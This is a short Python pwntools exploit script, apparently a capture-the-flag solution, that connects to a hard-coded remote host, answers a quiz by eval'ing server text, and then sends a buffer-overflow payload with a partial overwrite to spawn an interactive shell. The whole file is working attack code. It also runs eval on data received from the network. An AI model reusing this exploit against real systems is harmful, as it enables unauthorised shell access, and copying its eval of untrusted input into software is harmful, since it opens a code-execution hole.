#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "52.40.130.76"
port = 2345
r = remote(host,port)

# Need to brute force 4 bit

def hint():
    r.recvuntil(":")
    r.sendline("2")


def play(level,more):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil("?")
    r.sendline(str(level))
    r.recvuntil("?")
    r.sendline(str(more))

hint()
play(0,0)

for i in range(96):
    print i
    r.recvuntil("Question:")
    q = r.recvuntil("=")[:-1]
    ans =  eval(q.strip())
    r.recvuntil(":")
    r.sendline(str(ans))

r.recvuntil("Question:")
q = r.recvuntil("=")[:-1]
ans =  eval(q.strip())
r.recvuntil(":")
r.sendline(str(ans))

r.recvuntil(":")
r.send("sh\x00".ljust(0x30,"\x42") + "\xb8")

r.interactive()
